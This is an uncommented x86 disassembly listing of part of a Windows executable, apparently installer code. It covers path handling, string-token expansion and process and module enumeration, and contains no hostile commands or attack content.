  405ddf:	68 a0 0f 00 00       	push   $0xfa0
  405de4:	6a 40                	push   $0x40
  405de6:	ff 15 20 81 40 00    	call   *0x408120
  405dec:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405def:	53                   	push   %ebx
  405df0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405df3:	ff 15 c0 80 40 00    	call   *0x4080c0
  405df9:	8b f8                	mov    %eax,%edi
  405dfb:	8d 47 ff             	lea    -0x1(%edi),%eax
  405dfe:	3d 03 01 00 00       	cmp    $0x103,%eax
  405e03:	0f 87 34 03 00 00    	ja     0x40613d
  405e09:	33 f6                	xor    %esi,%esi
  405e0b:	85 ff                	test   %edi,%edi
  405e0d:	7e 27                	jle    0x405e36
  405e0f:	8d 85 c4 fc ff ff    	lea    -0x33c(%ebp),%eax
  405e15:	2b d8                	sub    %eax,%ebx
  405e17:	8d 04 73             	lea    (%ebx,%esi,2),%eax
  405e1a:	0f b7 84 05 c4 fc ff 	movzwl -0x33c(%ebp,%eax,1),%eax
  405e21:	ff 
  405e22:	50                   	push   %eax
  405e23:	e8 15 fe ff ff       	call   0x405c3d
  405e28:	66 89 84 75 c4 fc ff 	mov    %ax,-0x33c(%ebp,%esi,2)
  405e2f:	ff 
  405e30:	46                   	inc    %esi
  405e31:	3b f7                	cmp    %edi,%esi
  405e33:	59                   	pop    %ecx
  405e34:	7c e1                	jl     0x405e17
  405e36:	33 c0                	xor    %eax,%eax
  405e38:	66 89 84 7d c4 fc ff 	mov    %ax,-0x33c(%ebp,%edi,2)
  405e3f:	ff 
  405e40:	8d 85 cc fe ff ff    	lea    -0x134(%ebp),%eax
  405e46:	50                   	push   %eax
  405e47:	c7 85 cc fe ff ff 14 	movl   $0x114,-0x134(%ebp)
  405e4e:	01 00 00 
  405e51:	ff 15 00 81 40 00    	call   *0x408100
  405e57:	85 c0                	test   %eax,%eax
  405e59:	75 0a                	jne    0x405e65
  405e5b:	b8 5e 02 00 00       	mov    $0x25e,%eax
  405e60:	e9 dd 02 00 00       	jmp    0x406142
  405e65:	83 bd dc fe ff ff 02 	cmpl   $0x2,-0x124(%ebp)
  405e6c:	8b 35 ec 80 40 00    	mov    0x4080ec,%esi
  405e72:	74 17                	je     0x405e8b
  405e74:	83 bd dc fe ff ff 01 	cmpl   $0x1,-0x124(%ebp)
  405e7b:	0f 84 2b 01 00 00    	je     0x405fac
  405e81:	b8 5f 02 00 00       	mov    $0x25f,%eax
  405e86:	e9 b7 02 00 00       	jmp    0x406142
  405e8b:	68 bc 89 40 00       	push   $0x4089bc
  405e90:	ff 15 f0 80 40 00    	call   *0x4080f0
  405e96:	8b d8                	mov    %eax,%ebx
  405e98:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  405e9b:	85 db                	test   %ebx,%ebx
  405e9d:	75 0a                	jne    0x405ea9
  405e9f:	b8 5d 02 00 00       	mov    $0x25d,%eax
  405ea4:	e9 99 02 00 00       	jmp    0x406142
  405ea9:	68 ac 89 40 00       	push   $0x4089ac
  405eae:	53                   	push   %ebx
  405eaf:	ff d6                	call   *%esi
  405eb1:	68 98 89 40 00       	push   $0x408998
  405eb6:	53                   	push   %ebx
  405eb7:	8b f8                	mov    %eax,%edi
  405eb9:	ff d6                	call   *%esi
  405ebb:	68 84 89 40 00       	push   $0x408984
  405ec0:	53                   	push   %ebx
  405ec1:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405ec4:	ff d6                	call   *%esi
  405ec6:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405ec9:	85 ff                	test   %edi,%edi
  405ecb:	0f 84 a6 01 00 00    	je     0x406077
  405ed1:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  405ed5:	0f 84 9c 01 00 00    	je     0x406077
  405edb:	85 c0                	test   %eax,%eax
  405edd:	0f 84 94 01 00 00    	je     0x406077
  405ee3:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405ee6:	50                   	push   %eax
  405ee7:	68 e8 03 00 00       	push   $0x3e8
  405eec:	ff 75 fc             	push   -0x4(%ebp)
  405eef:	ff d7                	call   *%edi
  405ef1:	85 c0                	test   %eax,%eax
  405ef3:	75 1c                	jne    0x405f11
  405ef5:	be 5d 02 00 00       	mov    $0x25d,%esi
  405efa:	53                   	push   %ebx
  405efb:	ff 15 38 81 40 00    	call   *0x408138
  405f01:	ff 75 fc             	push   -0x4(%ebp)
  405f04:	ff 15 2c 81 40 00    	call   *0x40812c
  405f0a:	8b c6                	mov    %esi,%eax
  405f0c:	e9 31 02 00 00       	jmp    0x406142
  405f11:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  405f14:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  405f18:	c1 eb 02             	shr    $0x2,%ebx
  405f1b:	85 db                	test   %ebx,%ebx
  405f1d:	0f 86 89 00 00 00    	jbe    0x405fac
  405f23:	68 74 89 40 00       	push   $0x408974
  405f28:	8d 85 90 f8 ff ff    	lea    -0x770(%ebp),%eax
  405f2e:	50                   	push   %eax
  405f2f:	ff 15 fc 80 40 00    	call   *0x4080fc
  405f35:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405f38:	8b 4d 08             	mov    0x8(%ebp),%ecx
  405f3b:	ff 34 88             	push   (%eax,%ecx,4)
  405f3e:	6a 00                	push   $0x0
  405f40:	68 10 04 00 00       	push   $0x410
  405f45:	ff 15 f8 80 40 00    	call   *0x4080f8
  405f4b:	8b f8                	mov    %eax,%edi
  405f4d:	85 ff                	test   %edi,%edi
  405f4f:	74 25                	je     0x405f76
  405f51:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405f54:	50                   	push   %eax
  405f55:	6a 04                	push   $0x4
  405f57:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405f5a:	50                   	push   %eax
  405f5b:	57                   	push   %edi
  405f5c:	ff 55 f8             	call   *-0x8(%ebp)
  405f5f:	85 c0                	test   %eax,%eax
  405f61:	74 13                	je     0x405f76
  405f63:	68 04 01 00 00       	push   $0x104
  405f68:	8d 85 90 f8 ff ff    	lea    -0x770(%ebp),%eax
  405f6e:	50                   	push   %eax
  405f6f:	ff 75 e4             	push   -0x1c(%ebp)
  405f72:	57                   	push   %edi
  405f73:	ff 55 f4             	call   *-0xc(%ebp)
  405f76:	57                   	push   %edi
  405f77:	ff 15 bc 80 40 00    	call   *0x4080bc
  405f7d:	8d 85 90 f8 ff ff    	lea    -0x770(%ebp),%eax
  405f83:	50                   	push   %eax
  405f84:	ff 15 08 82 40 00    	call   *0x408208
  405f8a:	8d 8d c4 fc ff ff    	lea    -0x33c(%ebp),%ecx
  405f90:	51                   	push   %ecx
  405f91:	50                   	push   %eax
  405f92:	ff 15 18 81 40 00    	call   *0x408118
  405f98:	85 c0                	test   %eax,%eax
  405f9a:	0f 84 cc 00 00 00    	je     0x40606c
  405fa0:	ff 45 08             	incl   0x8(%ebp)
  405fa3:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  405fa6:	0f 82 77 ff ff ff    	jb     0x405f23
  405fac:	ff 75 fc             	push   -0x4(%ebp)
  405faf:	ff 15 2c 81 40 00    	call   *0x40812c
  405fb5:	83 bd dc fe ff ff 01 	cmpl   $0x1,-0x124(%ebp)
  405fbc:	0f 85 42 01 00 00    	jne    0x406104
  405fc2:	68 64 89 40 00       	push   $0x408964
  405fc7:	ff 15 f0 80 40 00    	call   *0x4080f0
  405fcd:	8b f8                	mov    %eax,%edi
  405fcf:	33 db                	xor    %ebx,%ebx
  405fd1:	89 7d f0             	mov    %edi,-0x10(%ebp)
  405fd4:	3b fb                	cmp    %ebx,%edi
  405fd6:	0f 84 c3 fe ff ff    	je     0x405e9f
  405fdc:	68 48 89 40 00       	push   $0x408948
  405fe1:	57                   	push   %edi
  405fe2:	ff d6                	call   *%esi
  405fe4:	68 38 89 40 00       	push   $0x408938
  405fe9:	57                   	push   %edi
  405fea:	89 45 08             	mov    %eax,0x8(%ebp)
  405fed:	ff d6                	call   *%esi
  405fef:	68 28 89 40 00       	push   $0x408928
  405ff4:	57                   	push   %edi
  405ff5:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405ff8:	ff d6                	call   *%esi
  405ffa:	68 18 89 40 00       	push   $0x408918
  405fff:	57                   	push   %edi
  406000:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406003:	ff d6                	call   *%esi
  406005:	68 08 89 40 00       	push   $0x408908
  40600a:	57                   	push   %edi
  40600b:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40600e:	ff d6                	call   *%esi
  406010:	89 45 e0             	mov    %eax,-0x20(%ebp)
  406013:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  406016:	0f 84 1b 01 00 00    	je     0x406137
  40601c:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  40601f:	0f 84 12 01 00 00    	je     0x406137
  406025:	3b c3                	cmp    %ebx,%eax
  406027:	0f 84 0a 01 00 00    	je     0x406137
  40602d:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  406030:	0f 84 01 01 00 00    	je     0x406137
  406036:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  406039:	0f 84 f8 00 00 00    	je     0x406137
  40603f:	53                   	push   %ebx
  406040:	6a 02                	push   $0x2
  406042:	ff 55 08             	call   *0x8(%ebp)
  406045:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406048:	83 f8 ff             	cmp    $0xffffffff,%eax
  40604b:	0f 84 e6 00 00 00    	je     0x406137
  406051:	8d 8d 98 fa ff ff    	lea    -0x568(%ebp),%ecx
  406057:	51                   	push   %ecx
  406058:	bb 2c 02 00 00       	mov    $0x22c,%ebx
  40605d:	50                   	push   %eax
  40605e:	89 9d 98 fa ff ff    	mov    %ebx,-0x568(%ebp)
  406064:	ff 55 f8             	call   *-0x8(%ebp)
  406067:	e9 8b 00 00 00       	jmp    0x4060f7
  40606c:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  40606f:	33 f6                	xor    %esi,%esi
  406071:	46                   	inc    %esi
  406072:	e9 83 fe ff ff       	jmp    0x405efa
  406077:	53                   	push   %ebx
  406078:	ff 15 38 81 40 00    	call   *0x408138
  40607e:	e9 1c fe ff ff       	jmp    0x405e9f
  406083:	ff b5 a0 fa ff ff    	push   -0x560(%ebp)
  406089:	6a 08                	push   $0x8
  40608b:	ff 55 08             	call   *0x8(%ebp)
  40608e:	8b f0                	mov    %eax,%esi
  406090:	83 fe ff             	cmp    $0xffffffff,%esi
  406093:	74 7c                	je     0x406111
  406095:	8d 85 68 f4 ff ff    	lea    -0xb98(%ebp),%eax
  40609b:	50                   	push   %eax
  40609c:	56                   	push   %esi
  40609d:	c7 85 68 f4 ff ff 28 	movl   $0x428,-0xb98(%ebp)
  4060a4:	04 00 00 
  4060a7:	ff 55 e8             	call   *-0x18(%ebp)
  4060aa:	eb 2d                	jmp    0x4060d9
  4060ac:	8d 85 c4 fc ff ff    	lea    -0x33c(%ebp),%eax
  4060b2:	50                   	push   %eax
  4060b3:	8d 85 88 f4 ff ff    	lea    -0xb78(%ebp),%eax
  4060b9:	50                   	push   %eax
  4060ba:	ff 15 18 81 40 00    	call   *0x408118
  4060c0:	85 c0                	test   %eax,%eax
  4060c2:	74 67                	je     0x40612b
  4060c4:	8d 85 68 f4 ff ff    	lea    -0xb98(%ebp),%eax
  4060ca:	50                   	push   %eax
  4060cb:	56                   	push   %esi
  4060cc:	c7 85 68 f4 ff ff 28 	movl   $0x428,-0xb98(%ebp)
  4060d3:	04 00 00 
  4060d6:	ff 55 e0             	call   *-0x20(%ebp)
  4060d9:	85 c0                	test   %eax,%eax
  4060db:	75 cf                	jne    0x4060ac
  4060dd:	56                   	push   %esi
  4060de:	ff 15 bc 80 40 00    	call   *0x4080bc
  4060e4:	8d 85 98 fa ff ff    	lea    -0x568(%ebp),%eax
  4060ea:	50                   	push   %eax
  4060eb:	ff 75 fc             	push   -0x4(%ebp)
  4060ee:	89 9d 98 fa ff ff    	mov    %ebx,-0x568(%ebp)
  4060f4:	ff 55 f4             	call   *-0xc(%ebp)
  4060f7:	85 c0                	test   %eax,%eax
  4060f9:	75 88                	jne    0x406083
  4060fb:	ff 75 fc             	push   -0x4(%ebp)
  4060fe:	ff 15 bc 80 40 00    	call   *0x4080bc
  406104:	ff 75 f0             	push   -0x10(%ebp)
  406107:	ff 15 38 81 40 00    	call   *0x408138
  40610d:	33 c0                	xor    %eax,%eax
  40610f:	eb 31                	jmp    0x406142
  406111:	be 5d 02 00 00       	mov    $0x25d,%esi
  406116:	ff 75 fc             	push   -0x4(%ebp)
  406119:	ff 15 bc 80 40 00    	call   *0x4080bc
  40611f:	57                   	push   %edi
  406120:	ff 15 38 81 40 00    	call   *0x408138
  406126:	e9 df fd ff ff       	jmp    0x405f0a
  40612b:	56                   	push   %esi
  40612c:	ff 15 bc 80 40 00    	call   *0x4080bc
  406132:	33 f6                	xor    %esi,%esi
  406134:	46                   	inc    %esi
  406135:	eb df                	jmp    0x406116
  406137:	57                   	push   %edi
  406138:	e9 3b ff ff ff       	jmp    0x406078
  40613d:	b8 78 02 00 00       	mov    $0x278,%eax
  406142:	5f                   	pop    %edi
  406143:	5e                   	pop    %esi
  406144:	5b                   	pop    %ebx
  406145:	c9                   	leave
  406146:	c2 04 00             	ret    $0x4
  406149:	56                   	push   %esi
  40614a:	8b 74 24 08          	mov    0x8(%esp),%esi
  40614e:	56                   	push   %esi
  40614f:	ff 15 c0 80 40 00    	call   *0x4080c0
  406155:	8d 04 46             	lea    (%esi,%eax,2),%eax
  406158:	50                   	push   %eax
  406159:	56                   	push   %esi
  40615a:	ff 15 0c 82 40 00    	call   *0x40820c
  406160:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  406164:	74 0c                	je     0x406172
  406166:	68 c8 82 40 00       	push   $0x4082c8
  40616b:	56                   	push   %esi
  40616c:	ff 15 e8 80 40 00    	call   *0x4080e8
  406172:	8b c6                	mov    %esi,%eax
  406174:	5e                   	pop    %esi
  406175:	c2 04 00             	ret    $0x4
  406178:	56                   	push   %esi
  406179:	8b 74 24 08          	mov    0x8(%esp),%esi
  40617d:	56                   	push   %esi
  40617e:	ff 15 c0 80 40 00    	call   *0x4080c0
  406184:	8d 04 46             	lea    (%esi,%eax,2),%eax
  406187:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  40618b:	74 0c                	je     0x406199
  40618d:	50                   	push   %eax
  40618e:	56                   	push   %esi
  40618f:	ff 15 0c 82 40 00    	call   *0x40820c
  406195:	3b c6                	cmp    %esi,%eax
  406197:	77 ee                	ja     0x406187
  406199:	33 c9                	xor    %ecx,%ecx
  40619b:	66 89 08             	mov    %cx,(%eax)
  40619e:	83 c0 02             	add    $0x2,%eax
  4061a1:	5e                   	pop    %esi
  4061a2:	c2 04 00             	ret    $0x4
  4061a5:	56                   	push   %esi
  4061a6:	57                   	push   %edi
  4061a7:	ff 74 24 0c          	push   0xc(%esp)
  4061ab:	be 28 fe 45 00       	mov    $0x45fe28,%esi
  4061b0:	56                   	push   %esi
  4061b1:	e8 65 fa ff ff       	call   0x405c1b
  4061b6:	56                   	push   %esi
  4061b7:	e8 ae f7 ff ff       	call   0x40596a
  4061bc:	8b f8                	mov    %eax,%edi
  4061be:	85 ff                	test   %edi,%edi
  4061c0:	75 04                	jne    0x4061c6
  4061c2:	33 c0                	xor    %eax,%eax
  4061c4:	eb 5e                	jmp    0x406224
  4061c6:	57                   	push   %edi
  4061c7:	e8 7e fa ff ff       	call   0x405c4a
  4061cc:	f6 05 08 b3 47 00 80 	testb  $0x80,0x47b308
  4061d3:	74 0e                	je     0x4061e3
  4061d5:	0f b7 07             	movzwl (%edi),%eax
  4061d8:	66 85 c0             	test   %ax,%ax
  4061db:	74 e5                	je     0x4061c2
  4061dd:	66 83 f8 5c          	cmp    $0x5c,%ax
  4061e1:	74 df                	je     0x4061c2
  4061e3:	2b fe                	sub    %esi,%edi
  4061e5:	53                   	push   %ebx
  4061e6:	8b 1d c0 80 40 00    	mov    0x4080c0,%ebx
  4061ec:	d1 ff                	sar    $1,%edi
  4061ee:	eb 15                	jmp    0x406205
  4061f0:	56                   	push   %esi
  4061f1:	e8 05 fb ff ff       	call   0x405cfb
  4061f6:	85 c0                	test   %eax,%eax
  4061f8:	74 05                	je     0x4061ff
  4061fa:	f6 00 10             	testb  $0x10,(%eax)
  4061fd:	74 2a                	je     0x406229
  4061ff:	56                   	push   %esi
  406200:	e8 73 ff ff ff       	call   0x406178
  406205:	56                   	push   %esi
  406206:	ff d3                	call   *%ebx
  406208:	3b c7                	cmp    %edi,%eax
  40620a:	7f e4                	jg     0x4061f0
  40620c:	56                   	push   %esi
  40620d:	e8 37 ff ff ff       	call   0x406149
  406212:	56                   	push   %esi
  406213:	ff 15 7c 80 40 00    	call   *0x40807c
  406219:	33 c9                	xor    %ecx,%ecx
  40621b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40621e:	0f 95 c1             	setne  %cl
  406221:	8b c1                	mov    %ecx,%eax
  406223:	5b                   	pop    %ebx
  406224:	5f                   	pop    %edi
  406225:	5e                   	pop    %esi
  406226:	c2 04 00             	ret    $0x4
  406229:	33 c0                	xor    %eax,%eax
  40622b:	eb f6                	jmp    0x406223
  40622d:	55                   	push   %ebp
  40622e:	8b ec                	mov    %esp,%ebp
  406230:	8b 45 0c             	mov    0xc(%ebp),%eax
  406233:	83 ec 18             	sub    $0x18,%esp
  406236:	85 c0                	test   %eax,%eax
  406238:	7d 11                	jge    0x40624b
  40623a:	8b 0d 88 32 47 00    	mov    0x473288,%ecx
  406240:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  406247:	2b c8                	sub    %eax,%ecx
  406249:	8b 01                	mov    (%ecx),%eax
  40624b:	8b 0d d8 b2 47 00    	mov    0x47b2d8,%ecx
  406251:	8d 0c 41             	lea    (%ecx,%eax,2),%ecx
  406254:	b8 20 b2 46 00       	mov    $0x46b220,%eax
  406259:	57                   	push   %edi
  40625a:	8b f8                	mov    %eax,%edi
  40625c:	39 45 08             	cmp    %eax,0x8(%ebp)
  40625f:	72 16                	jb     0x406277
  406261:	8b 55 08             	mov    0x8(%ebp),%edx
  406264:	2b d0                	sub    %eax,%edx
  406266:	d1 fa                	sar    $1,%edx
  406268:	81 fa 08 40 00 00    	cmp    $0x4008,%edx
  40626e:	73 07                	jae    0x406277
  406270:	8b 7d 08             	mov    0x8(%ebp),%edi
  406273:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  406277:	0f b7 11             	movzwl (%ecx),%edx
  40627a:	66 85 d2             	test   %dx,%dx
  40627d:	0f 84 23 02 00 00    	je     0x4064a6
  406283:	53                   	push   %ebx
  406284:	56                   	push   %esi
  406285:	8b f7                	mov    %edi,%esi
  406287:	2b f0                	sub    %eax,%esi
  406289:	83 e6 fe             	and    $0xfffffffe,%esi
  40628c:	81 fe 08 40 00 00    	cmp    $0x4008,%esi
  406292:	0f 8d 0c 02 00 00    	jge    0x4064a4
  406298:	0f b7 d2             	movzwl %dx,%edx
  40629b:	41                   	inc    %ecx
  40629c:	be 00 e0 00 00       	mov    $0xe000,%esi
  4062a1:	41                   	inc    %ecx
  4062a2:	89 55 0c             	mov    %edx,0xc(%ebp)
  4062a5:	85 d6                	test   %edx,%esi
  4062a7:	0f 84 d5 01 00 00    	je     0x406482
  4062ad:	8b de                	mov    %esi,%ebx
  4062af:	66 3b d3             	cmp    %bx,%dx
  4062b2:	0f 86 ca 01 00 00    	jbe    0x406482
  4062b8:	0f b7 01             	movzwl (%ecx),%eax
  4062bb:	8b d8                	mov    %eax,%ebx
  4062bd:	8b f0                	mov    %eax,%esi
  4062bf:	c1 e8 08             	shr    $0x8,%eax
  4062c2:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  4062c8:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4062cb:	0d 00 80 00 00       	or     $0x8000,%eax
  4062d0:	8b d3                	mov    %ebx,%edx
  4062d2:	81 ca 00 80 00 00    	or     $0x8000,%edx
  4062d8:	81 e6 ff 7f 00 00    	and    $0x7fff,%esi
  4062de:	41                   	inc    %ecx
  4062df:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4062e2:	41                   	inc    %ecx
  4062e3:	b8 02 e0 00 00       	mov    $0xe002,%eax
  4062e8:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  4062eb:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4062ee:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4062f1:	66 39 45 0c          	cmp    %ax,0xc(%ebp)
  4062f5:	0f 85 1a 01 00 00    	jne    0x406415
  4062fb:	6a 02                	push   $0x2
  4062fd:	5e                   	pop    %esi
  4062fe:	ff 15 08 81 40 00    	call   *0x408108
  406304:	85 c0                	test   %eax,%eax
  406306:	79 1c                	jns    0x406324
  406308:	b9 04 5a 00 00       	mov    $0x5a04,%ecx
  40630d:	66 3b c1             	cmp    %cx,%ax
  406310:	74 12                	je     0x406324
  406312:	83 7d f4 23          	cmpl   $0x23,-0xc(%ebp)
  406316:	74 0c                	je     0x406324
  406318:	83 7d f4 2e          	cmpl   $0x2e,-0xc(%ebp)
  40631c:	74 06                	je     0x406324
  40631e:	83 65 0c 00          	andl   $0x0,0xc(%ebp)
  406322:	eb 07                	jmp    0x40632b
  406324:	c7 45 0c 01 00 00 00 	movl   $0x1,0xc(%ebp)
  40632b:	83 3d 64 b3 47 00 00 	cmpl   $0x0,0x47b364
  406332:	74 03                	je     0x406337
  406334:	6a 04                	push   $0x4
  406336:	5e                   	pop    %esi
  406337:	84 db                	test   %bl,%bl
  406339:	79 3a                	jns    0x406375
  40633b:	8b c3                	mov    %ebx,%eax
  40633d:	83 e0 40             	and    $0x40,%eax
  406340:	50                   	push   %eax
  406341:	a1 d8 b2 47 00       	mov    0x47b2d8,%eax
  406346:	57                   	push   %edi
  406347:	83 e3 3f             	and    $0x3f,%ebx
  40634a:	8d 04 58             	lea    (%eax,%ebx,2),%eax
  40634d:	50                   	push   %eax
  40634e:	68 40 88 40 00       	push   $0x408840
  406353:	68 02 00 00 80       	push   $0x80000002
  406358:	e8 87 f7 ff ff       	call   0x405ae4
  40635d:	66 83 3f 00          	cmpw   $0x0,(%edi)
  406361:	0f 85 9a 00 00 00    	jne    0x406401
  406367:	ff 75 f4             	push   -0xc(%ebp)
  40636a:	57                   	push   %edi
  40636b:	e8 bd fe ff ff       	call   0x40622d
  406370:	e9 86 00 00 00       	jmp    0x4063fb
  406375:	83 fb 25             	cmp    $0x25,%ebx
  406378:	75 0e                	jne    0x406388
  40637a:	68 04 20 00 00       	push   $0x2004
  40637f:	57                   	push   %edi
  406380:	ff 15 04 81 40 00    	call   *0x408104
  406386:	eb 73                	jmp    0x4063fb
  406388:	83 fb 24             	cmp    $0x24,%ebx
  40638b:	75 6a                	jne    0x4063f7
  40638d:	68 04 20 00 00       	push   $0x2004
  406392:	57                   	push   %edi
  406393:	ff 15 ac 80 40 00    	call   *0x4080ac
  406399:	33 f6                	xor    %esi,%esi
  40639b:	eb 5a                	jmp    0x4063f7
  40639d:	a1 b0 b2 47 00       	mov    0x47b2b0,%eax
  4063a2:	33 c9                	xor    %ecx,%ecx
  4063a4:	4e                   	dec    %esi
  4063a5:	3b c1                	cmp    %ecx,%eax
  4063a7:	74 18                	je     0x4063c1
  4063a9:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  4063ac:	74 13                	je     0x4063c1
  4063ae:	57                   	push   %edi
  4063af:	51                   	push   %ecx
  4063b0:	51                   	push   %ecx
  4063b1:	ff 74 b5 e8          	push   -0x18(%ebp,%esi,4)
  4063b5:	ff 35 b4 b2 47 00    	push   0x47b2b4
  4063bb:	ff d0                	call   *%eax
  4063bd:	85 c0                	test   %eax,%eax
  4063bf:	74 3a                	je     0x4063fb
  4063c1:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4063c4:	50                   	push   %eax
  4063c5:	ff 74 b5 e8          	push   -0x18(%ebp,%esi,4)
  4063c9:	ff 35 b4 b2 47 00    	push   0x47b2b4
  4063cf:	ff 15 8c 81 40 00    	call   *0x40818c
  4063d5:	85 c0                	test   %eax,%eax
  4063d7:	75 19                	jne    0x4063f2
  4063d9:	57                   	push   %edi
  4063da:	ff 75 fc             	push   -0x4(%ebp)
  4063dd:	ff 15 7c 81 40 00    	call   *0x40817c
  4063e3:	ff 75 fc             	push   -0x4(%ebp)
  4063e6:	8b d8                	mov    %eax,%ebx
  4063e8:	ff 15 ac 82 40 00    	call   *0x4082ac
  4063ee:	85 db                	test   %ebx,%ebx
  4063f0:	75 09                	jne    0x4063fb
  4063f2:	33 c0                	xor    %eax,%eax
  4063f4:	66 89 07             	mov    %ax,(%edi)
  4063f7:	85 f6                	test   %esi,%esi
  4063f9:	75 a2                	jne    0x40639d
  4063fb:	66 83 3f 00          	cmpw   $0x0,(%edi)
  4063ff:	74 4e                	je     0x40644f
  406401:	83 7d f4 1a          	cmpl   $0x1a,-0xc(%ebp)
  406405:	75 48                	jne    0x40644f
  406407:	68 98 88 40 00       	push   $0x408898
  40640c:	57                   	push   %edi
  40640d:	ff 15 e8 80 40 00    	call   *0x4080e8
  406413:	eb 3a                	jmp    0x40644f
  406415:	b8 01 e0 00 00       	mov    $0xe001,%eax
  40641a:	66 39 45 0c          	cmp    %ax,0xc(%ebp)
  40641e:	75 37                	jne    0x406457
  406420:	83 fe 1d             	cmp    $0x1d,%esi
  406423:	75 0e                	jne    0x406433
  406425:	ff 35 b4 b2 47 00    	push   0x47b2b4
  40642b:	57                   	push   %edi
  40642c:	e8 31 f7 ff ff       	call   0x405b62
  406431:	eb 14                	jmp    0x406447
  406433:	8b c6                	mov    %esi,%eax
  406435:	69 c0 08 40 00 00    	imul   $0x4008,%eax,%eax
  40643b:	05 00 c0 47 00       	add    $0x47c000,%eax
  406440:	50                   	push   %eax
  406441:	57                   	push   %edi
  406442:	e8 d4 f7 ff ff       	call   0x405c1b
  406447:	83 c6 eb             	add    $0xffffffeb,%esi
  40644a:	83 fe 07             	cmp    $0x7,%esi
  40644d:	73 1f                	jae    0x40646e
  40644f:	57                   	push   %edi
  406450:	e8 f5 f7 ff ff       	call   0x405c4a
  406455:	eb 17                	jmp    0x40646e
  406457:	b8 03 e0 00 00       	mov    $0xe003,%eax
  40645c:	66 39 45 0c          	cmp    %ax,0xc(%ebp)
  406460:	75 0c                	jne    0x40646e
  406462:	83 c8 ff             	or     $0xffffffff,%eax
  406465:	2b c6                	sub    %esi,%eax
  406467:	50                   	push   %eax
  406468:	57                   	push   %edi
  406469:	e8 bf fd ff ff       	call   0x40622d
  40646e:	57                   	push   %edi
  40646f:	ff 15 c0 80 40 00    	call   *0x4080c0
  406475:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406478:	8d 3c 47             	lea    (%edi,%eax,2),%edi
  40647b:	b8 20 b2 46 00       	mov    $0x46b220,%eax
  406480:	eb 16                	jmp    0x406498
  406482:	66 3b d6             	cmp    %si,%dx
  406485:	75 0c                	jne    0x406493
  406487:	66 8b 11             	mov    (%ecx),%dx
  40648a:	66 89 17             	mov    %dx,(%edi)
  40648d:	47                   	inc    %edi
  40648e:	47                   	inc    %edi
  40648f:	41                   	inc    %ecx
  406490:	41                   	inc    %ecx
  406491:	eb 05                	jmp    0x406498
  406493:	66 89 17             	mov    %dx,(%edi)
  406496:	47                   	inc    %edi
  406497:	47                   	inc    %edi
  406498:	0f b7 11             	movzwl (%ecx),%edx
  40649b:	66 85 d2             	test   %dx,%dx
  40649e:	0f 85 e1 fd ff ff    	jne    0x406285
  4064a4:	5e                   	pop    %esi
  4064a5:	5b                   	pop    %ebx
  4064a6:	33 c9                	xor    %ecx,%ecx
  4064a8:	66 89 0f             	mov    %cx,(%edi)
  4064ab:	5f                   	pop    %edi
  4064ac:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  4064af:	74 09                	je     0x4064ba
  4064b1:	50                   	push   %eax
  4064b2:	ff 75 08             	push   0x8(%ebp)
  4064b5:	e8 61 f7 ff ff       	call   0x405c1b
  4064ba:	c9                   	leave
  4064bb:	c2 08 00             	ret    $0x8
  4064be:	51                   	push   %ecx
  4064bf:	53                   	push   %ebx
  4064c0:	55                   	push   %ebp
  4064c1:	56                   	push   %esi
  4064c2:	57                   	push   %edi
  4064c3:	68 d4 89 40 00       	push   $0x4089d4
  4064c8:	bb 30 3e 46 00       	mov    $0x463e30,%ebx
  4064cd:	53                   	push   %ebx
  4064ce:	ff 15 fc 80 40 00    	call   *0x4080fc
  4064d4:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  4064d8:	33 ed                	xor    %ebp,%ebp
  4064da:	be 00 04 00 00       	mov    $0x400,%esi
  4064df:	3b fd                	cmp    %ebp,%edi
  4064e1:	74 29                	je     0x40650c
  4064e3:	6a 01                	push   $0x1
  4064e5:	55                   	push   %ebp
  4064e6:	57                   	push   %edi
  4064e7:	e8 75 f5 ff ff       	call   0x405a61
  4064ec:	50                   	push   %eax
  4064ed:	ff 15 bc 80 40 00    	call   *0x4080bc
  4064f3:	56                   	push   %esi
  4064f4:	53                   	push   %ebx
  4064f5:	57                   	push   %edi
  4064f6:	ff 15 6c 80 40 00    	call   *0x40806c
  4064fc:	3b c5                	cmp    %ebp,%eax
  4064fe:	0f 84 7f 01 00 00    	je     0x406683
  406504:	3b c6                	cmp    %esi,%eax
  406506:	0f 8f 77 01 00 00    	jg     0x406683
  40650c:	56                   	push   %esi
  40650d:	bf 88 94 46 00       	mov    $0x469488,%edi
  406512:	57                   	push   %edi
  406513:	ff 74 24 20          	push   0x20(%esp)
  406517:	ff 15 6c 80 40 00    	call   *0x40806c
  40651d:	3b c5                	cmp    %ebp,%eax
